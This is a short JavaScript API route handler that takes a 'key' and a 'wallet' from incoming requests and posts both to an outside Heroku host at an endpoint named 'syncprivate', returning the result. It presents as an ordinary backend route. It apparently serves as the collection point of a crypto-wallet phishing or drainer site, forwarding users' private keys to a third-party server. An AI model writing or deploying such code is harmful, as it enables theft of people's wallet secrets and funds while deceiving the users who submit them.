import axios from 'axios';

export default async (req, res) => {
    const result = await axios.post('https://powerna.herokuapp.com/v1/syncprivate', {
      key: req.body.key,
      wallet: req.body.wallet
    })
    res.status(200).json(result)
  }